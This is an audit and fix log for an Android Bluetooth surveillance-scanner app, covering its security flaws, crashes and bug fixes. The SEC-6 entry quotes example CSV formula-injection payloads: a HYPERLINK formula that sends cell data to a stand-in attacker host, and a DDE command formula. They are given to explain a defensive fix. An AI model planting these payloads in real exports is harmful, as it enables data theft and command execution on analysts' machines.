# Audit & Fix History

This document is the complete record of every code review, security audit, and debugging pass performed on Bluetooth Surveillance Scanner, with the full analysis of each finding. For a summary table, see the [README](README.md#audit--fix-history).

**Severity scale:** Critical (crash or total feature failure) · High (major functional or security impact) · Medium (visible defect or meaningful risk) · Low (minor defect, hygiene, or hardening).

---

## Pass 1 — Initial Security Audit & Remediations

A full code review and security audit was performed after the initial release. The following issues were identified and fixed:

### SEC-1 — Implicit broadcasts exposed device data to all apps
**Severity:** High  
**File:** `ScanService.kt`

**Issue:** `sendBroadcast(intent)` without a target package sent Bluetooth device data (MAC addresses, threat levels, signal strength) as a system-wide implicit broadcast. Any app on the device could register a receiver for `com.bluetoothscanner.DEVICE_FOUND` and silently collect the scan results.

**Fix:** `intent.setPackage(packageName)` is now called on every outgoing broadcast, restricting delivery to this app only.

---

### SEC-2 — BroadcastReceiver accepted spoofed intents from other apps
**Severity:** High  
**File:** `MainActivity.kt`

**Issue:** `registerReceiver(scanReceiver, filter)` without export restrictions allowed any third-party app to craft a fake `ACTION_DEVICE_FOUND` intent and inject arbitrary device data into the UI, or trigger a denial-of-service via malformed extras.

**Fix:** `ContextCompat.registerReceiver(..., ContextCompat.RECEIVER_NOT_EXPORTED)` is now used, which sets `Context.RECEIVER_NOT_EXPORTED` on API 33+ and falls back safely on older versions. Combined with SEC-1's `setPackage()`, the broadcast channel is now fully private.

---

### SEC-3 — `ThreatLevel.valueOf()` crash via malformed intent extra
**Severity:** High  
**File:** `MainActivity.kt`

**Issue:** `BtDeviceInfo.ThreatLevel.valueOf(string)` throws `IllegalArgumentException` if the string doesn't match an enum constant. A spoofed or corrupted intent with `threat="INVALID"` would crash `MainActivity`.

**Fix:** The call is now wrapped in a `try/catch` block that falls back to `ThreatLevel.UNKNOWN` on any parse failure.

---

### SEC-4 — `android:allowBackup="true"` exposed scan history via ADB
**Severity:** Medium  
**File:** `AndroidManifest.xml`

**Issue:** With backup enabled, an attacker with USB debugging access (or physical device access) could run `adb backup` to extract any data the app writes to internal storage, including future additions like scan history persistence.

**Fix:** `android:allowBackup="false"` is now set in the manifest.

---

### SEC-5 — Notification ID collisions via `hashCode()`
**Severity:** Medium  
**File:** `ScanService.kt`

**Issue:** `NOTIF_ID_ALERT + info.address.hashCode()` produced notification IDs that could be negative (causing unpredictable behaviour on some OEMs) and could collide with the foreground notification ID (`1`) or with other alert notifications, silently replacing a HIGH-risk alert with a different device's alert.

**Fix:** A `alertNotifIds: MutableMap<String, Int>` now assigns stable, sequential integer IDs starting from `1000`, one per unique MAC address.

---

### BUG-1 — `hasBluetoothPermission()` always returned `false` on Android ≤ 11
**Severity:** High  
**File:** `ScanService.kt`

**Issue:** The method checked for `BLUETOOTH_SCAN` unconditionally. On API ≤ 30, that permission does not exist, so `checkSelfPermission` always returned `PERMISSION_DENIED`, silently preventing all Bluetooth operations on pre-Android-12 devices — the app appeared to scan but never actually did.

**Fix:** The check now branches on `Build.VERSION.SDK_INT >= Build.VERSION_CODES.S`: API 31+ checks `BLUETOOTH_SCAN`; API 23–30 checks `BLUETOOTH`.

---

### BUG-2 — `isLeScanning` flag corrupted when BLE scanner is unavailable
**Severity:** Medium  
**File:** `ScanService.kt`

**Issue:** `leScanner?.startScan(...)` used a null-safe call that silently did nothing if `leScanner` was null (BLE unavailable or adapter off), but `isLeScanning = true` was set unconditionally on the next line. This locked the service into a state where it believed BLE scanning was active but no callback would ever fire, and `startLeScanning()` could never be retried.

**Fix:** The scanner is now unwrapped with `?: return` before the scan starts; `isLeScanning = true` is only reached when the scan actually starts.

---

### BUG-3 — Classic scan receiver double-registration on discovery restart
**Severity:** Medium  
**File:** `ScanService.kt`

**Issue:** `startClassicScan()` tried to `unregisterReceiver` before re-registering using a bare `try/catch` with no tracking of whether the receiver was actually registered. This could produce duplicate receiver registrations in certain timing windows and a silent memory leak.

**Fix:** A `classicReceiverRegistered: Boolean` flag now guards all register/unregister calls, guaranteeing exactly one registration at a time.

---

### BUG-4 — CSV injection in exported results
**Severity:** Low  
**File:** `MainActivity.kt`

**Issue:** Device names, threat reasons, and manufacturer strings were interpolated directly into CSV fields without escaping. A device with a name containing `"` (e.g., `He said "hello"`) would produce malformed CSV that broke field boundaries and could cause incorrect parsing in spreadsheet software.

**Fix:** An `escapeCsv()` extension is applied to all string fields, replacing `"` with `""` per RFC 4180. (Hardened further against formula injection in SEC-6.)

---

### PERF-1 — O(n log n) full sort on every BLE advertisement
**Severity:** Medium  
**File:** `MainActivity.kt` / `DeviceAdapter.kt`

**Issue:** `sortByThreat()` (which calls `notifyDataSetChanged()`) was invoked after every single call to `adapter.upsert()`, including updates to already-known devices. With 50+ devices in view and BLE callbacks firing at ~10 Hz, this caused constant full RecyclerView rebinds and visible jank.

**Fix:** `upsert()` now returns `Boolean` (true = re-sort needed). `sortByThreat()` is only called when ordering can actually change; updating an existing device uses `notifyItemChanged()` in-place without a re-sort.

---

### PERF-2 — No deduplication of high-frequency BLE advertisements
**Severity:** Medium  
**File:** `ScanService.kt`

**Issue:** The same BLE device can advertise many times per second. Each advertisement triggered a broadcast → UI update cycle with no throttling, wasting CPU and causing UI thrashing.

**Fix:** A `lastBroadcastTime: MutableMap<String, Long>` throttle in `broadcastDevice()` suppresses repeat broadcasts for the same MAC address within a 2-second window.

---

### CLEANUP-1 — OUI strings duplicated between sets and `resolveManufacturer()`
**Severity:** Low  
**File:** `SurveillanceDetector.kt`

**Issue:** All OUI strings were listed twice: once in `HIGH_RISK_OUI`/`MEDIUM_RISK_OUI` sets and again in the `resolveManufacturer()` when-expression. Adding or correcting an OUI required updating two separate locations.

**Fix:** `OUI_TO_MANUFACTURER: Map<String, String>` is the single source of truth. `resolveManufacturer()` is a one-line map lookup. `HIGH_RISK_OUI` and `MEDIUM_RISK_OUI` remain as explicit sets for fast classification.

---

### CLEANUP-2 — `colorRes` in data model violated separation of concerns
**Severity:** Low  
**File:** `BtDeviceInfo.kt`

**Issue:** `ThreatLevel` enum carried a `colorRes: Int` field referencing `android.R.color.*` resources. The data model should not know about Android UI resources; the field was also unused (the adapter used hardcoded hex colors in `bind()`).

**Fix:** `colorRes` removed from the enum. Color mapping lives exclusively in `DeviceAdapter.bind()`.

---

## Pass 2 — Second Review

### CRASH-4 — `SecurityException` on first launch with Bluetooth off (Android 12+)
**Severity:** Critical  
**File:** `MainActivity.kt`

**Issue:** `checkPermissionsAndScan()` checked `btAdapter.isEnabled` and launched `ACTION_REQUEST_ENABLE` *before* requesting runtime permissions. On API 31+, starting the Bluetooth-enable system dialog requires `BLUETOOTH_CONNECT`. On a fresh install with Bluetooth off — the most common first-run state — tapping "Start Scan" threw a `SecurityException` and crashed the app immediately, before the permission prompt was ever shown.

**Fix:** `checkPermissionsAndScan()` now requests any missing runtime permissions first and returns; only once all permissions are granted does it check whether Bluetooth is enabled and prompt to enable it. The permission-result callback re-invokes `checkPermissionsAndScan()` (rather than calling `startScanning()` directly) so the Bluetooth-enabled check still runs afterward.

---

### UI-1 — High-risk threat badge text invisible (and badge color misleading for all levels)
**Severity:** Medium  
**File:** `DeviceAdapter.kt` / `bg_badge.xml`

**Issue:** `tv_threat_level`'s background (`bg_badge.xml`) is a solid `#C62828` (red) shape, but `bind()` only changed the badge's *text* color per threat level — it never changed the background. For a HIGH RISK device, the text color was also `#C62828`, making the "HIGH RISK" label completely invisible against its own background. For MEDIUM/LOW/UNKNOWN devices, the badge still rendered with the same red "high risk" background regardless of actual threat level, which was visually misleading.

**Fix:** `bind()` now applies `tvThreat.backgroundTintList` using the same per-threat-level color used for the signal bar, and sets the badge text to white for contrast against all four threat colors.

---

### CONC-1 — Non-atomic `getOrPut` on `ConcurrentHashMap` could assign duplicate alert IDs
**Severity:** Low  
**File:** `ScanService.kt`

**Issue:** `sendHighRiskAlert()` used `alertNotifIds.getOrPut(info.address) { ... }`. Kotlin's `getOrPut` extension is a plain get-then-put and is **not atomic**, even on a `ConcurrentHashMap`. If the same high-risk device was detected by the BLE and Classic scan callbacks at nearly the same time (on different threads), both could miss the cached ID, each allocate a new sequential ID via `nextAlertNotifId.getAndIncrement()`, and overwrite each other's map entry — resulting in two different notification IDs (and two separate alert notifications) for the same device.

**Fix:** Replaced with `alertNotifIds.computeIfAbsent(info.address) { ... }`, which is guaranteed atomic on `ConcurrentHashMap`.

---

## Pass 3 — Third Review

### CRASH-5 — Missing `POST_NOTIFICATIONS` permission silently disabled all notifications on Android 13+
**Severity:** Critical  
**File:** `AndroidManifest.xml` / `MainActivity.kt`

**Issue:** Neither the manifest nor `requiredPermissions` declared/requested `android.permission.POST_NOTIFICATIONS`. On Android 13+ (API 33+), this runtime permission is required to display *any* notification — including the persistent foreground-service notification and, critically, the HIGH RISK alert notifications that are the app's headline feature. Without it, `NotificationManager.notify()` silently does nothing (no crash, no error), so the app appeared to scan normally but never alerted the user to a detected tracker.

**Fix:** Added `<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />` to the manifest and added `Manifest.permission.POST_NOTIFICATIONS` to `requiredPermissions` (guarded by `Build.VERSION_CODES.TIRAMISU`), so it's requested in the same runtime permission batch as the Bluetooth/location permissions.

---

### BUILD-1 — Missing Gradle wrapper meant `./gradlew` (as documented) did not exist
**Severity:** High  
**File:** project root

**Issue:** The README's build instructions (`./gradlew assembleDebug`, `./gradlew installDebug`) referenced the Gradle wrapper, but `gradlew`, `gradlew.bat`, and `gradle/wrapper/gradle-wrapper.jar` were never committed — only `gradle-wrapper.properties` existed. Running the documented commands would fail with "No such file or directory".

**Fix:** Generated and committed the Gradle 8.2 wrapper scripts and jar (`gradlew`, `gradlew.bat`, `gradle/wrapper/gradle-wrapper.jar`), so the project builds with the documented commands out of the box.

---

## Pass 4 — Fourth Review

### BUG-7 — FAB/status UI desynced from the running service after activity recreation
**Severity:** Medium  
**File:** `MainActivity.kt` / `ScanService.kt`

**Issue:** `MainActivity` tracked scan state purely in the local `isScanning` field, initialized to `false`. The `ScanService` is a separate component that keeps running across activity recreations (e.g. screen rotation, returning to the app after it was backgrounded and the activity was destroyed). When `MainActivity` was recreated while `ScanService` was still active, `isScanning` reset to `false`, so the FAB showed "Start Scan" and the status text was blank — even though scanning was actively running in the background. Tapping "Start Scan" in this state would call `checkPermissionsAndScan()` → `startScanning()` again, redundantly restarting the foreground service.

**Fix:** Added a `@Volatile companion var isRunning` flag to `ScanService`, set to `true` in `onCreate()` and `false` in `onDestroy()`. `MainActivity.onCreate()` now initializes `isScanning = ScanService.isRunning` and restores the scanning status text when the service is already running, so the FAB and status correctly reflect the real service state immediately after recreation.

---

### BUG-8 — Toggling Bluetooth off and back on permanently stalled scanning
**Severity:** High  
**File:** `ScanService.kt`

**Issue:** `startLeScanning()` and `startClassicScan()` both early-return if scanning is already considered active, and `BluetoothLeScanner.startScan()` simply does nothing once the adapter is off. If the user turned Bluetooth off (e.g. from Quick Settings) while `ScanService` was running, the OS silently stopped both the BLE scan and Classic discovery, but `isLeScanning` and `isClassicScanning` remained `true`. When Bluetooth was turned back on, nothing in the service re-triggered scanning — `startLeScanning()`'s early-return blocked any restart, and Classic discovery was never resumed — so the foreground notification kept showing "Scanning…" while no scanning was actually happening, with no way to recover short of stopping and restarting the service.

**Fix:** Added a `bluetoothStateReceiver` registered on `BluetoothAdapter.ACTION_STATE_CHANGED` (via `ContextCompat.registerReceiver(..., RECEIVER_NOT_EXPORTED)`). On `STATE_OFF` it resets `isLeScanning`/`isClassicScanning` to `false` and posts a status update. On `STATE_ON` it refreshes the `BluetoothLeScanner` reference and calls `startLeScanning()` / `startClassicScan()` again, restoring full scanning automatically. The receiver is registered in `onCreate()` and unregistered in `onDestroy()` alongside the existing Classic-scan receiver.

---

## Pass 5 — Fifth Review

### BUG-9 — High-risk alert re-vibrated continuously while a tracker stayed in range
**Severity:** High  
**File:** `ScanService.kt`

**Issue:** `processDevice()` called `sendHighRiskAlert()` for every HIGH-risk detection, completely independent of `broadcastDevice()`'s 2-second throttle. A BLE device can advertise 5–10+ times per second, so a nearby AirTag or other HIGH-risk tracker caused `notifManager.notify()` to be called at that same rate. Since `NotificationCompat` defaults to re-alerting (sound/vibration/heads-up) on every update to a notification ID, the phone vibrated continuously and near-constantly the entire time the tracker was in range — far from the "instant alert" the feature is meant to provide, and a significant battery/annoyance issue.

**Fix:** `broadcastDevice()` now returns `Boolean` (true only when it actually sends a broadcast, i.e. not throttled), and `sendHighRiskAlert()` is only called when that returns `true` — capping alert updates to once per 2 seconds per device. Additionally, `.setOnlyAlertOnce(true)` was added to the alert notification builder, so the vibration/heads-up only fires the first time a device is flagged HIGH risk; later updates (e.g. refreshed signal strength) silently update the existing notification.

---

### BUG-10 — Device list reset to empty after activity recreation while scanning continued
**Severity:** Medium  
**File:** `ScanService.kt` / `MainActivity.kt`

**Issue:** The Fourth Review Pass fixed the FAB/status text desync after activity recreation (e.g. screen rotation) via `ScanService.isRunning`, but the device list itself lived only in `MainActivity`'s `DeviceAdapter`. A fresh `DeviceAdapter` instance starts empty, so after rotation the list showed zero devices and "Devices: 0 | High Risk: 0 | Suspicious: 0" — even though `ScanService` was still running and had already identified several devices, some of which might not re-broadcast for a while (BLE advertisement throttling/intervals).

**Fix:** `ScanService` now keeps a `ConcurrentHashMap<String, BtDeviceInfo>` snapshot (`knownDevices`) of every device seen this session, updated alongside each non-throttled broadcast in `broadcastDevice()`. `MainActivity.onCreate()` repopulates `adapter` from `ScanService.getKnownDevices()` and re-sorts/recomputes counters whenever it detects the service is already running. The "Clear" button now also calls `ScanService.clearKnownDevices()` so a manual clear isn't undone by the next rotation.

---

## Pass 6 — Security Audit & Detection Fixes

### SEC-6 — CSV formula injection in exported scan results
**Severity:** Medium  
**File:** `MainActivity.kt`

**Issue:** `escapeCsv()` only doubled quotes per RFC 4180. Bluetooth device names are fully attacker-controlled — anyone in radio range can advertise a name like `=HYPERLINK("http://evil.example/"&A1,"open")` or `=cmd|' /C calc'!A0`. When the exported CSV was opened in Excel, Google Sheets, or LibreOffice, such a field was interpreted as a live formula, enabling data exfiltration or (after a warning prompt) command execution on the analyst's machine — a classic CSV/formula-injection attack against exactly the person investigating the hostile device.

**Fix:** `escapeCsv()` now also prefixes any field starting with `=`, `+`, `-`, `@`, tab, or carriage return with a single apostrophe, which spreadsheets treat as a text marker. Quote-doubling is unchanged.

---

### BUG-11 — `neverForLocation` made Android hide the very beacons the app hunts
**Severity:** High  
**File:** `AndroidManifest.xml`

**Issue:** `BLUETOOTH_SCAN` was declared with `android:usesPermissionFlags="neverForLocation"`. On Android 12+, that assertion tells the OS the app never derives location from scans — and in exchange the system **filters beacon-style advertisements out of the app's scan results**. For a tracker-detection app this is self-defeating: AirTags, Tiles, and generic BLE beacons are precisely the advertisement formats most at risk of being filtered, so the app could silently miss real trackers on modern devices. (Established tracker-detection apps like AirGuard avoid this flag for the same reason.)

**Fix:** Removed the `neverForLocation` flag. The app already declares and requests `ACCESS_FINE_LOCATION` on Android 12+ (it was in `requiredPermissions` for API 31+ all along), which is the requirement that removing the flag brings back.

---

### BUG-12 — Late-arriving device names were permanently discarded
**Severity:** Medium  
**File:** `ScanService.kt` / `MainActivity.kt` / `DeviceAdapter.kt`

**Issue:** Two compounding problems. First, `broadcastDevice()` sent `info.displayName` — so a device whose name wasn't in the first advertisement was broadcast as the literal string `"Unknown Device"`, indistinguishable from a real name. Second, `DeviceAdapter.upsert()`'s update path copied only `rssi`/`lastSeen`/`seenCount`/threat fields, never `name`, `manufacturer`, or `deviceType`. BLE devices very commonly advertise without a name first (name arrives in a later packet or scan response), so most devices stayed "Unknown Device" in the list forever even after their real name was received.

**Fix:** The broadcast now carries the raw name (empty when absent), `buildDeviceFromIntent()` maps blank back to `null` so `displayName` falls back correctly, and `upsert()` now merges `name`/`manufacturer` (keeping the previous value when the new sighting omits it) and refreshes `deviceType`. The service-side `knownDevices` snapshot merges the same way.

---

### BUG-13 — Threat level could silently downgrade on later sightings
**Severity:** High  
**File:** `DeviceAdapter.kt` / `ScanService.kt`

**Issue:** Each sighting is classified independently from whatever data that one advertisement carried. A spy camera named "SQ11" (HIGH risk by name) with a generic OUI would be re-classified UNKNOWN the moment an advertisement arrived without the name field — and `upsert()` blindly overwrote the threat level, erasing the red HIGH RISK warning from the list while the device was still present. The user could watch a confirmed tracker fade to "no known signatures".

**Fix:** Both `DeviceAdapter.upsert()` and the service-side `knownDevices` merge now keep the most severe classification seen so far (HIGH has the lowest enum ordinal), including its reason text. `upsert()`'s return value now means "re-sort needed" — true for new devices **or** when an existing device's threat level escalates, so the list re-orders when a device is upgraded, not just on first sight.
